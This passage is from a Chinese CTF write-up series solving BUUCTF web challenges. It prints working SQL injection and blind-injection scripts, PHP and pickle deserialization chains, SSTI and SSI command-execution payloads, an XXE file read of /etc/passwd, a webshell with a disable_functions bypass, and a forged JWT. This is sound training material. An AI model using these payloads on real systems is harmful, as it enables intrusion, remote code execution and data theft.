json\n\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if (not os.path.exists(self.sandbox)):\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print resp\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n\n\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\n\n\n@app.route('/De1ta', methods=['GET', 'POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if (waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n\n\n@app.route('/')\ndef index():\n    return open(\"code.txt\", \"r\").read()\n\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\n\ndef waf(param):\n    check = param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0', port=9999)\n\n\n```\n\n看代码关键点就是`Task`类中的函数执行，分析得出只要`action`中同时含有scan和read即可读取出文件并返回，而在`De1ta`路径中有创建`Task`类的过程，`geneSign`路径中可以获取sign值，所以让`action=scanread&parma=flag.txt`，通过`geneSign`路径获取sign即可，`getSign`函数中md5内容的拼接，是`secert_key + param + action`，而对于`geneSign`路径来说，action永远为scan，所以geneSign结果就是`secert_key + param + 'scan'`拼接出带有同时带有scan和read只要让`param=flag.txtread`即可，传入`geneSign`拿到sign值\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-29 15.50.50.png)\n\n最终payload如下\n\n```\npayload:De1ta?param=flag.txt\nCookie: action=readscan;sign=1983e9273c0ae452b67ccecb2fb88ed2;\n```\n\n## [网鼎杯 2020 朱雀组]Nmap\n\n详见该题：[BUUCTF 2018]Online Tool\n\n\n\n## [SWPU2019]Web1\n\n是SQL注入\n\n1、空格过滤\n\n2、注释符过滤\n\n3、[information_schema绕过](https://www.anquanke.com/post/id/193512)\n\n4、无列名注入\n\n第一个用/**/绕过就行\n\n第二个末尾加单引号闭合就行\n\n最后一个使用innodb引擎绕过\n\n条件是MySQL版本>5.5\n\n表名在innodb_table_stats\n\n列名在innodb_table_index\n\nselect table_name from mysql.innodb_table_stats where database_name=database()\n\n首先是测试列数，为22列，回显在2，3位，然后爆表名\n\n```\n-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)from(mysql.innodb_table_stats)where(database_name=database())),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n```\n\n表名：ads，users\n\n无列名注入\n\n```text\nselect 1,2,3 union select * from admin;\n```\n\n这样的话union select的内容就是前三列的内容\n\n```text\nselect `3` from (select 1,2,3 union select * from admin)a;\n```\n\n或者\n\n```\nselect b from (select 1,2,3 as b union select * from admin)a;\n```\n\n这样就是第三列的内容\n\n```\npayload:-1'/**/union/**/select/**/1,(select/**/group_concat(b)from(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n```\n\n## [MRCTF2020]Ezpop\n\n```PHP\nWelcome to index.php\n<?php\n//flag is in flag.php\n//WTF IS THIS?\n//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\n//And Crack It!\nclass Modifier {\n    protected $var;\n    public function append($value){\n        include($value);\n    }\n    public function __invoke(){\n        $this->append($this->var);\n    }\n}\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file='index.php'){\n        $this->source = $file;\n        echo 'Welcome to '.$this->source.\"<br>\";\n    }\n    public function __toString(){\n        return $this->str->source;\n    }\n    public function __wakeup(){\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker\";\n            $this->source = \"index.php\";\n        }\n    }\n}\nclass Test{\n    public $p;\n    public function __construct(){\n        $this->p = array();\n    }\n\n    public function __get($key){\n        $function = $this->p;\n        return $function();\n    }\n}\n\nif(isset($_GET['pop'])){\n    @unserialize($_GET['pop']);\n}\nelse{\n    $a=new Show;\n    highlight_file(__FILE__);\n}\n?>\n```\n\n反序列化不用多说，最后应该文件包含加PHP伪协议读取，找链子\n\n`__invoke`需要以函数调用类，在Test的`__get`方法中，`__get`方法在Show中`__toString`调用类中不存在的方法时会被调用，最终构造出的就是\n\n```PHP\n<?php\nclass Modifier{\n    protected $var = 'php://filter/read=convert.base64-encode/resource=flag.php';\n}\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file)\n    {\n        $this->source = $file;\n    }\n    public function __toString(){\n        return \"output anything you want\";\n    }\n}\nclass Test{\n    public $p;\n}\n$payload = new Show('test');\n$payload->str = new Test();\n$payload->str->p = new Modifier();\n$hack = new Show($payload);\necho urlencode(serialize($hack));\n?>\n```\n\n内容base64解码即可\n\n## [NPUCTF2020]ReadlezPHP\n\n查看源代码，发现了时间显示所使用的./time.php?source\n\n```PHP\n<?php\n#error_reporting(0);\nclass HelloPhp\n{\n    public $a;\n    public $b;\n    public function __construct(){\n        $this->a = \"Y-m-d h:i:s\";\n        $this->b = \"date\";\n    }\n    public function __destruct(){\n        $a = $this->a;\n        $b = $this->b;\n        echo $b($a);\n    }\n}\n$c = new HelloPhp;\n\nif(isset($_GET['source']))\n{\n    highlight_file(__FILE__);\n    die(0);\n}\n\n@$ppp = unserialize($_GET[\"data\"]);\n?>\n```\n\n反序列化构造出以b为函数名，以a为参数的函数执行即可，尝试system发现没有回显，可能是被过滤，再尝试eval，也被过滤，放弃执行系统命令，尝试执行php函数，使用assert包裹phpinfo()，查找flag成功\n\n## [CISCN2019 华东南赛区]Web11\n\n在XFF位置尝试SSTI成功，输入{{config}}报错发现使用的是smarty渲染，{system('ls /')}发现flag，{system('cp /flag /var/www/html/flag.txt')}将文件带出即可\n\n## [极客大挑战 2019]FinalSQL\n\n点提示发现注入点，过滤了空格，还是数字型注入，使用布尔盲注\n\n```\n爆库名：\nid=2^(ascii(substr((select(database())),{i},1))={ord(j)})\n正确返回3，错误返回2\n爆表名\nid=2^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),{i},1))={ord(j)})\n爆列名\nid=2^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),{i},1))={ord(j)})\n```\n\n最终payload脚本\n\n```python\nimport requests\nurl=\"http://93af0548-22e2-4a84-8fd6-3a78dfdda8f3.node4.buuoj.cn:81/search.php\"\nname=\",QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890\"\nflag=\"flag{1234567890-bcde},\"\nfor i in range(1,100):\n    for j in flag:\n        parma={\n            'id':f\"2^(ascii(substr((select(group_concat(password))from(F1naI1y)where(username='flag')),{i},1))={ord(j)})\"\n        }\n        tex=requests.get(url,params=parma).text\n        if \"Ohhh You find the flag read on!\" in tex:\n            print(j,end='')\n            break\n```\n\n## [0CTF 2016]piapiapia\n\n没啥内容先扫目录，www.zip扫出源码，发现有隐藏的注册页面，先进行注册和登录，然后再查看源码\n\n```PHP\nindex.php和register.php一个登录一个注册\nclass.php关键函数\npublic function filter($string) {\n\t$escape = array('\\'', '\\\\\\\\');\n\t$escape = '/' . implode('|', $escape) . '/';\n\t$string = preg_replace($escape, '_', $string);\n\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t$safe = '/' . implode('|', $safe) . '/i';\n\treturn preg_replace($safe, 'hacker', $string);\n}\nupdate.php更新个人信息内容\nif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\t$username = $_SESSION['username'];\n\tif(!preg_match('/^\\d{11}$/', $_POST['phone']))\n\t\tdie('Invalid phone');\n\n\tif(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n\t\tdie('Invalid email');\n\t\n\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\tdie('Invalid nickname');\n\n\t$file = $_FILES['photo'];\n\tif($file['size'] < 5 or $file['size'] > 1000000)\n\t\tdie('Photo size error');\n\n\tmove_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n\t$profile['phone'] = $_POST['phone'];\n\t$profile['email'] = $_POST['email'];\n\t$profile['nickname'] = $_POST['nickname'];\n\t$profile['photo'] = 'upload/' . md5($file['name']);\n\t$user->update_profile($username, serialize($profile));\n\techo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n}\nprofile.php\n$profile = unserialize($profile);\n$phone = $profile['phone'];\t\t\n$email = $profile['email'];\n$nickname = $profile['nickname'];\n$photo = base64_encode(file_get_contents($profile['photo']));//关键，如果其中photo文件名是config.php即可读取到flag\n```\n\n反序列化字符逃逸漏洞：\n\n```\n原始序列化字符串：\na:1:{s:5:\"phone\";s:5:\"where\";}\n此时读取到的内容是phone=where\n将字符串进行过滤，preg_replace('where', 'hacker', $string);\n序列化后字符串变为\na:1:{s:5:\"phone\";s:5:\"hacker\";}\n此时反序列化只读取前5位，hacke，后面的r就属于逃逸的字符了，那么如果我们构造出一个能逃逸足够长的字符的字符串，就可以让序列化后的字符串存入我们需要的内容，在本题中我们想要传入的是s:5:\"photo\";s:10:\"config.php\";}，而又因为我们需要对nickname的内容进行绕过，此时nickname是一个数组所以我们最终需要逃逸的字符串就是\"}s:5:\"photo\";s:10:\"config.php\";}，所以最后构造payload使用关键字where，替换为hacker后能溢出，上面字符串有34个字符那么我们传入34个where+字符串即可\n```\n\npayload\n\n```\nnickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}\n```\n\n## [BJDCTF2020]EasySearch\n\n扫描，得到index.php.swp\n\n```PHP\n<?php\n\tob_start();\n\tfunction get_hash(){\n\t\t$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';\n\t\t$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\n\t\t$content = uniqid().$random;\n\t\treturn sha1($content); \n\t}\n    header(\"Content-Type: text/html;charset=utf-8\");\n\t***\n    if(isset($_POST['username']) and $_POST['username'] != '' )\n    {\n        $admin = '6d0bc1';\n        if ( $admin == substr(md5($_POST['password']),0,6)) {\n            echo \"<script>alert('[+] Welcome to manage system')</script>\";\n            $file_shtml = \"public/\".get_hash().\".shtml\";\n            $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");\n            $text = '\n            ***\n            ***\n            <h1>Hello,'.$_POST['username'].'</h1>\n            ***\n\t\t\t***';\n            fwrite($shtml,$text);\n            fclose($shtml);\n            ***\n\t\t\techo \"[!] Header  error ...\";\n        } else {\n            echo \"<script>alert('[!] Failed')</script>\";\n            \n    }else\n    {\n\t***\n    }\n\t***\n?>\n```\n\n要求password经过md5处理后前六位是6d0bc1\n\n贴一个爆破的脚本\n\n```python\nimport hashlib\nfor i in range(1000000000):\n    a = hashlib.md5(str(i).encode('utf-8')).hexdigest()\n    if a[0:6] == '6d0bc1':\n        print(i)\n        print(a)\n```\n\n抓包发现响应头中\n\n```\nUrl_is_here: public/11b26335b1b3d0a88c6ec7333d2f5f522d1237f2.shtml\n```\n\n访问尝试XFF SSTI失败，看看wp吧，是SSI注入漏洞\n\n```\nSSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。\n\nSSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。\n\n从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。\n```\n\n首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用#include引用进来。\n\n**①显示服务器端环境变量<#echo>**\n\n本文档名称：\n\n`<!–#echo var=\"DOCUMENT_NAME\"–>`\n\n现在时间：\n\n`<!–#echo var=\"DATE_LOCAL\"–>`\n\n显示IP地址：\n\n`<! #echo var=\"REMOTE_ADDR\"–>`\n\n**②将文本内容直接插入到文档中<#include>**\n\n`<! #include file=\"文件名称\"–>`\n\n`<!--#include virtual=\"index.html\" -->`\n\n`<! #include virtual=\"文件名称\"–>`\n\n`<!--#include virtual=\"/www/footer.html\" -->`\n\n注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径\n\n**③显示WEB文档相关信息<#flastmod><#fsize>(如文件制作日期/大小等)**\n\n文件最近更新日期：\n\n`<! #flastmod file=\"文件名称\"–>`\n\n文件的长度：\n\n`<!–#fsize file=\"文件名称\"–>`\n\n**④直接执行服务器上的各种程序<#exec>(如CGI或其他可执行程序)**\n\n`<!–#exec cmd=\"文件名称\"–>`\n\n`<!--#exec cmd=\"cat /etc/passwd\"-->`\n\n`<!–#exec cgi=\"文件名称\"–>`\n\n`<!--#exec cgi=\"/cgi-bin/access_log.cgi\"–>`\n\n将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。\n\n**⑤设置SSI信息显示格式<#config>(如文件制作日期/大小显示方式**)\n\n**⑥高级SSI可设置变量使用if条件语句。**\n\n所以我们传入`<!–#exec cmd=\"系统命令\"–>`即可执行系统命令，password内容已确定，只能通过username传入\n\n```\npayload:\nPOST\nusername=<!--#exec cmd=\"cat ../flag_990c66bf85a09c664f0b6741840499b2\"-->&password=2020666\n```\n\n## [GYCTF2020]FlaskApp\n\n解密处SSTI\n\n过滤了*，system，os\n\n试试读取文件源码，找到了黑名单\n\n`black_list = [\"flag\",\"os\",\"system\",\"popen\",\"import\",\"eval\",\"chr\",\"request\", \"subprocess\",\"commands\",\"socket\",\"hex\",\"base64\",\"*\",\"?\"]`\n\n使用加号绕过，遍历根目录\n\n`{{url_for.__globals__[\"o\"+\"s\"].listdir('/')}}`\n\n发现`this_is_the_flag.txt`文件\n\n`{{url_for.__globals__['__builtins__'].open('/this_is_the_f' + 'lag.txt','r').read()}}`\n\n拿到flag\n\n## [BSidesCF 2019]Kookie\n\n```\nCookie: username=admin\n```\n\n## [极客大挑战 2019]RCE ME\n\n```php\n<?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n\t$code=$_GET['code'];\n\tif(strlen($code)>40){\n\t\tdie(\"This is too Long.\");\n\t}\n\tif(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n\t\tdie(\"NO.\");\n\t}\n\t@eval($code);\n}\nelse{\n\thighlight_file(__FILE__);\n}\n?>\n```\n\n取反绕过，先试试phpinfo\n\n```\ncode=(~%8F%97%8F%96%91%99%90)();\n```\n\n禁用大量系统命令执行函数，构造eval使用蚁剑\n\n```\ncode=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6);\n//assert((eval($_POST[a])))\n```\n\n发现读不到flag，看wp，是一个PHP7的禁用函数绕过漏洞\n\n```\n这里用工具\n地址https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\n由于在/var/tmp目录 有上传权限，可以上传bypass_disablefun_x64.so和bypass_disablefunc.php（重命名为shell.php），\n```\n\n```\n然后需要构造一个新的payload:\n根据“?code=${*GET}[_](https://www.cnblogs.com/yunqian2017/p/${_GET}[_]);&*=assert&_=eval($_POST['a'])”\n使用的是异或绕过，\n最后的payload是\n```\n\n```\ncode=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&_=assert&__=include(%27/var/tmp/shell.php%27)&cmd=/readflag&outpath=/tmp/tmpfile&sopath=/var/tmp/bypass_disablefunc_x64.so\n```\n\n## [MRCTF2020]套娃\n\n查看源码\n\n```PHP\n$query = $_SERVER['QUERY_STRING'];\nif(substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){\n\tdie('Y0u are So cutE!');\n}\nif($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){\n\techo \"you are going to the next ~\";\n}\n```\n\n要求传参变量名为`b_u_p_t`又要求队列字符串中不能有下划线，可以使用空格绕过，而匹配起始结尾都要有23333，使用换行绕过\n\n```\n?b u p t=23333%0A\n```\n\n查看源码，发现有brainfuck注释内容，在控制台执行，发现需要POST传参Merak，传入后查看代码\n\n```PHP\n<?php \nerror_reporting(0); \ninclude 'takeip.php';\nini_set('open_basedir','.'); \ninclude 'flag.php';\nif(isset($_POST['Merak'])){ \n    highlight_file(__FILE__); \n    die(); \n} \nfunction change($v){ \n    $v = base64_decode($v); \n    $re = ''; \n    for($i=0;$i<strlen($v);$i++){ \n        $re .= chr ( ord ($v[$i]) + $i*2 ); \n    } \n    return $re; \n}\necho 'Local access only!'.\"<br/>\";\n$ip = getIp();\nif($ip!='127.0.0.1')\necho \"Sorry,you don't have permission!  Your ip is :\".$ip;\nif($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){\necho \"Your REQUEST is:\".change($_GET['file']);\necho file_get_contents(change($_GET['file'])); }\n?> \n```\n\nip匹配绕过使用Client-ip请求头，file_get_contents使用data伪协议传入\n\n```\n?2333=data:text/plain,todat is a happy day&file=ZmpdYSZmXGI=\n```\n\n查看源码得到flag\n\n## [WUSTCTF2020]颜值成绩查询\n\n布尔盲注，看这题[[极客大挑战 2019]FinalSQL](#极客大挑战-2019-FinalSQL)\n\n```python\nimport requests\nurl=\"http://e3fad2bd-ba6f-41a9-bb23-275458f3c9ed.node4.buuoj.cn:81/\"\nname=\",QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890\"\nflag=\"flag{1234567890-bcde},\"\nfor i in range(1,100):\n    for j in flag:\n        parma={\n            'stunum':f\"1*(ascii(substr((select(group_concat(value))from(ctf.flag)),{i},1))={ord(j)})\"\n        }\n        tex=requests.get(url,params=parma).text\n        if \"Hi admin, your score is: 100\" in tex:\n            print(j,end='')\n            break\n```\n\n## [FBCTF2019]RCEService\n\n%0A换行截断绕过\n\n```\npayload:\ncmd={%0A\"cmd\":\"/bin/cat /home/rceservice/flag\"%0A}\n```\n\n## [Zer0pts2020]Can you guess it?\n\n先看源码\n\n```PHP\n<?php\ninclude 'config.php'; // FLAG is defined in config.php\n\nif (preg_match('/config\\.php\\/*$/i', $_SERVER['PHP_SELF'])) {\n  exit(\"I don't know what you are thinking, but I won't let you read it :)\");\n}\n\nif (isset($_GET['source'])) {\n  highlight_file(basename($_SERVER['PHP_SELF']));\n  exit();\n}\n\n$secret = bin2hex(random_bytes(64));\nif (isset($_POST['guess'])) {\n  $guess = (string) $_POST['guess'];\n  if (hash_equals($secret, $guess)) {\n    $message = 'Congratulations! The flag is: ' . FLAG;\n  } else {\n    $message = 'Wrong.';\n  }\n}\n?>\n```\n\n利用的是`basename`函数和`$_SERVER['PHP_SELF']`\n\nbasename函数会返回路径中的文件名部分，如\n\n```\nbasename(\"/var/www/html/index.php\")=index.php\n```\n\n`$_SERVER['PHP_SELF']`返回的是url中文件部分\n\n```\nhttp://127.0.0.1/test/index.php\nPHP_SELF内容就是/test/index.php\n```\n\nbasename函数有一个bug，它会去掉文件名开头的非ASCII值，所以我们构造payload在config.php最后再加一个非ascii字符即可\n\n```\npayload:\nindex.php/config.php/%FF?source\n```\n\n## [NCTF2019]Fake XML cookbook\n\n随意输入用户名密码，抓包发现内容使用xml传输，尝试构造XXE漏洞\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE note [\n<!ENTITY admin SYSTEM \"file:///etc/passwd\">\n]>\n<user><username>&admin;</username><password>123456</password></user>\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-03 23.20.24.png)\n\n测试回显成功\n\n猜测flag在根目录下，拿到flag\n\n## [CISCN2019 华北赛区 Day1 Web2]ikun\n\n看标题内容，提示要买LV6\n\n```\n## 爆破*站：资金募集 11540.0\nikun们冲鸭,一定要买到lv6!!!\n```\n\n写个脚本先找到LV6\n\n```python\nimport requests\nurl=\"http://14806839-f3e4-4cb2-8762-4f6d771a95b0.node4.buuoj.cn:81/shop?page=\"\nname=\"static/img/lv/lv6.png\"\ni=2\nwhile 1:\n    tex=requests.get(url+str(i)).text\n    if name in tex:\n        print(i)\n    i+=1\n```\n\n发现在181页\n\n需要的money~~太臭了不买了~~太多了，抓包更改折扣购买，而后提示该页面只允许admin访问，抓包发现JWT，找个[脚本](https://github.com/brendan-rius/c-jwt-cracker)爆破密钥\n\n爆破出的密钥为`1Kun`\n\n再在[jwt.io]()中生成新的jwt\n\n```\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo\n```\n\n![](https://img-blog.csdnimg.cn/1be8776440c7499882db6dfd0e32d3cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZWxpZm9yc2hhcm9u,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-03 23.47.04.png)\n\n看源码下载文件\n\n关键内容在sshop/views/Admin.py\n\n```python\n#Admin.py\nimport tornado.web\nfrom sshop.base import BaseHandler\nimport pickle\nimport urllib\n\n\nclass AdminHandler(BaseHandler):\n    @tornado.web.authenticated\n    def get(self, *args, **kwargs):\n        if self.current_user == \"admin\":\n            return self.render('form.html', res='This is Black Technology!', member=0)\n        else:\n            return self.render('no_ass.html')\n\n    @tornado.web.authenticated\n    def post(self, *args, **kwargs):\n        try:\n            become = self.get_argument('become')\n            p = pickle.loads(urllib.unquote(become))\n            return self.render('form.html', res=p, member=1)\n        except:\n            return self.render('form.html', res='This is Black Technology!', member=0)\n\n```\n\n题目中提示了pickle，看看这是个什么东西\n\n> python的pickle模块实现了基本的数据序列和反序列化\n>\n> | 函数  | 说明                             |\n> | ----- | -------------------------------- |\n> | dumps | 对象反序列化为bytes对象          |\n> | dump  | 对象反序列化到文件对象，存入文件 |\n> | loads | 从bytes对象反序列化              |\n> | load  | 对象反序列化，从文件中读取数据   |\n\n```python\n#文件\n#序列化\npickle.dump(obj, file, protocol=None,)\nobj表示要进行封装的对象(必填参数）\nfile表示obj要写入的文件对象\n以二进制可写模式打开即wb(必填参数）\n#反序列化\npickle.load(file, *, fix_imports=True, encoding=\"ASCII\", errors=\"strict\", buffers=None)\nfile文件中读取封存后的对象\n以二进制可读模式打开即rb(必填参数)\n#对象\n#序列化\npickle.dumps(obj, protocol=None,*,fix_imports=True)\ndumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。\n#反序列化\npickle.loads(bytes_object, *,fix_imports=True, encoding=\"ASCII\". errors=\"strict\")\nloads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。\n```\n\n查找后得知[pickle反序列化漏洞](https://www.freebuf.com/articles/web/252189.html)\n\n> 简而言之，pickle的loads在进行反序列化的时候会调用`__reduce__`魔术方法，也就可以利用该魔术方法构造payload\n\n命令执行例子\n\n```python\nimport pickle\nimport os\n\nclass Test2(object):\n    def __reduce__():\n    \t#被调用函数的参数\n        cmd = \"/usr/bin/id\" \n        return (os.system,(cmd,))\n\nif __name__ == \"__main__\":\n    test = Test2()\n    #执行序列化操作\n    result1 = pickle.dumps(test)\n    #执行反序列化操作\n    result2 = pickle.loads(result1)\n\n# __reduce__()魔法方法的返回值:\n# return(os.system,(cmd,))\n# 1.满足返回一个元组，元组中有两个参数\n# 2.第一个参数是被调用函数 : os.system()\n# 3.第二个参数是一个元组:(cmd,),元组中被调用的参数 cmd\n# 4. 因此序列化时被解析执行的代码是 os.system(\"/usr/bin/id\")\n```\n\n那么就来构造个payload吧\n\n```python\n#python2\nimport pickle\nimport urllib\n\nclass payload(object):\n    def __reduce__(self):\n       return (eval, (\"open('/flag.txt','r').read()\",))\n\na = pickle.dumps(payload())\na = urllib.quote(a)\nprint a\n```\n\n```\nc__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.\n```\n\n提交即可\n\n## [GWCTF 2019]枯燥的抽奖\n\n源码\n\n```\n<?php \n#这不是抽奖程序的源代码！不许看！ \nheader(\"Content-Type: text/html;charset=utf-8\"); \nsession_start(); \nif(!isset($_SESSION['seed'])){ \n$_SESSION['seed']=rand(0,999999999); \n} \n\nmt_srand($_SESSION['seed']); \n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; \n$str=''; \n$len1=20; \nfor ( $i = 0; $i < $len1; $i++ ){ \n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);        \n} \n$str_show = substr($str, 0, 10); \necho \"<p id='p1'>\".$str_show.\"</p>\"; \n\n\nif(isset($_POST['num'])){ \n    if($_POST['num']===$str){x \n        echo \"<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>\"; \n    } \n    else{ \n        echo \"<p id=flag>没抽中哦，再试试吧</p>\"; \n    } \n} \nshow_source(\"check.php\");\n```\n\n伪随机数漏洞，先算出需要的随机数吧\n\n```python\ns = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nkey = 'S5KnjyVcrs'\nm = ''\nfor i in key:\n    for j in range(len(s)):\n        if i == s[j]:\n            m += \"{} {} 0 {} \".format(j,j,len(s)-1)\nprint(m)\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-04 22.41.58.png)\n\n跑出来一个尝试一下\n\n```\n<?php\n#version:php7.3.4\nmt_srand(830361885);\n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n$str='';\n$len1=20;\nfor ( $i = 0; $i < $len1; $i++ ){\n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       \n}\necho $str;\n```\n\n成功\n\n## [CSCCTF 2019 Qual]FlaskLight\n\nSSTI\n\nconfig里面有提示\n\n```\n'SECRET_KEY': 'CCC{f4k3_Fl49_:v} CCC{the_flag_is_this_dir}'\n```\n\n构造读文件的类咯\n\n```\nsearch={{''.__class__.__mro__[-1].__subclasses__()}}\n里面有<class 'subprocess.Popen'>，在258位\n```\n\n```\npayload:search={{''.__class__.__mro__[-1].__subclasses__()[258]('cat flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}\n```\n\n## [SUCTF 2019]Pythonginx\n\n进入就是源码\n\n```python\n@app.route('/getUrl', methods=['GET', 'POST'])\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname #解析出主机名\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1] #再次解析主机名\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'): #对www.example.com按.划分，先按idna编码，再utf-8解码\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost) #组合好解码后的主机名\n    #去掉 url 中的空格\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname #解析出主机名，要等于suctf.cc\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return \"我扌 your problem? 333\"\n```\n\n搞个脚本尝试跑出最后的c中以idna编码后再经过utf8编码结果为C的内容\n\n```python\nfor i in range(128,65537):    \n    tmp=chr(i)\n    try:\n        res = 